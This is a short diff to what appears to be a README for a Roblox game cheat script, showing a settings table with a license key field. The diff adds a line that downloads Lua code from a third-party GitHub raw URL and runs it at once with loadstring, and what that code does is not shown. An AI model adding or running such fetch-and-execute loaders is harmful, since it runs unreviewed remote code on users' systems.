@@ -16,7 +16,11 @@
     ["Auto Open Hellfire Gifts"] = false, -- Boolean (true, false)
     ["License"] = "" -- Script License Key.
 }
+local Success, Error = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/weecody099/Spunk/refs/heads/main/99/Cannon.lua"))()
+end)
 
+print(Success, Error)
 ```
 **Usage Of Blacklisted Cannons**
 ```
